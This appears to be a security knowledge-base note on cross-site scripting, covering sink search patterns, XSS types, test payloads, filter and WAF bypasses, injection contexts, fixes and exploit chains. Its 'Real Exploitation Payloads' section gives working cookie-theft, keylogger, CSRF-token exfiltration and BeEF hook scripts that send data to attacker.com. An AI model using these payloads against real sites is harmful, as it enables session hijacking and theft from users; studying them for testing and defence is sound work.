# XSS — Cross-Site Scripting

**Tags:** #medium #high #xss #frontend #injection #javascript
**OWASP:** A03:2021 Injection
**CVSS Base:** 6.1 (Medium) — 8.8 (High — Stored XSS with no CSP)

---

## 📖 What it is

XSS allows an attacker to inject malicious scripts into web pages viewed by other users. The victim's browser executes the script in the context of the target application.

---

## 🔍 `grep_search` Tactics

```
innerHTML
document.write(
dangerouslySetInnerHTML
outerHTML
insertAdjacentHTML
v-html
eval(
setTimeout(str
setInterval(str
location.href =
element.src =
.href = req
```

---

## 📊 XSS Types

### 1. Reflected XSS (Stored=No)
- Payload lives in the URL or parameter
- Not persisted on the server
- Requires the victim to click a malicious link
- **Severity:** Low–Medium

```
URL: http://target.com/search?q=<script>alert(1)</script>
Server reflects: <p>Results for <script>alert(1)</script></p>
```

### 2. Stored XSS (Persistent)
- Payload is saved in the database/server
- Executed for every user who views the page
- **Severity:** High–Critical (especially in admin areas)

```
Malicious comment: <script>document.location='http://attacker.com/?c='+document.cookie</script>
 Every user who reads the comment has their cookies stolen
```

### 3. DOM-Based XSS
- The payload never reaches the server
- Flows from a DOM source to a DOM sink in the browser

See: [[dom-based-xss-postmessage]]

---

## 💣 Detection Payloads

### Basic (initial tests)
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Simple Filter Bypasses
```html
<!-- Broken tag bypass -->
<scr<script>ipt>alert(1)</scr</script>ipt>

<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Encoding -->
<script>&#097;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>

<!-- Event handlers without script tag -->
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror="alert(1)">

<!-- javascript: protocol -->
<a href="javascript:alert(1)">click</a>

<!-- Template literals -->
<script>alert`1`</script>
```

### WAF Bypass (filtering `alert`)
```html
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(document.cookie)</script>
<svg/onload=eval(atob('YWxlcnQoMSk='))>    Base64 of alert(1)
```

---

## 💣 Real Exploitation Payloads

### Cookie Theft (Session Hijacking)
```html
<script>
fetch('https://attacker.com/?c=' + btoa(document.cookie))
</script>

<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
```

### Keylogger
```html
<script>
document.addEventListener('keydown', e => {
  fetch('https://attacker.com/k?key=' + e.key);
});
</script>
```

### Silent Defacement (for demonstration)
```html
<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
```

### BeEF Hook (Browser Exploitation Framework)
```html
<script src="http://attacker.com:3000/hook.js"></script>
```

### CSRF Token Exfiltration
```html
<script>
fetch('/api/csrf-token')
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/?t=' + data.token));
</script>
```

---

## 🧪 Injection Context

Identifying **where** the input is reflected determines the correct payload:

| Context | Example | Payload |
|---|---|---|
| HTML body | `<p>INPUT</p>` | `<script>alert(1)</script>` |
| HTML attribute | `<input value="INPUT">` | `"><script>alert(1)</script>` |
| Event attribute | `<div onmouseover="INPUT">` | `alert(1)` |
| JavaScript string | `var name = "INPUT";` | `";alert(1)//` |
| URL | `href="INPUT"` | `javascript:alert(1)` |
| CSS | `style="color:INPUT"` | `red;}</style><script>alert(1)</script>` |

---

## 🛡️ Fix

```javascript
//  React  JSX escapes by default
return <p>{userInput}</p>; // safe

//  Never use dangerouslySetInnerHTML with external input
return <div dangerouslySetInnerHTML={{__html: userInput}} />; // DANGEROUS
```

```javascript
//  Vanilla JS  use textContent, not innerHTML
element.textContent = userInput; // safe
// element.innerHTML = userInput; //  DANGEROUS
```

```python
#  Flask/Jinja2  auto-escape enabled by default in .html files
# in render_template_string: {{ input }} is safe, {{ input | safe }} is not
```

**Content-Security-Policy (CSP):**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

---

## 🔗 Chain Exploits

```
XSS + no CSP  Maximum severity for this category
Stored XSS + Admin Panel  Compromise of everything the admin accesses
XSS + CSRF token leak  Full CSRF bypass
XSS + WebSocket  Real-time reading of private messages
Reflected XSS + Open Redirect  Trusted phishing URL
XSS + window.postMessage  Cross-origin data exfiltration
```

---

## 📌 References
- [[dom-based-xss-postmessage]]
- [[http-security-headers]]
- [[csrf-websocket-hijacking-cswsh]]
- [[open-redirect]]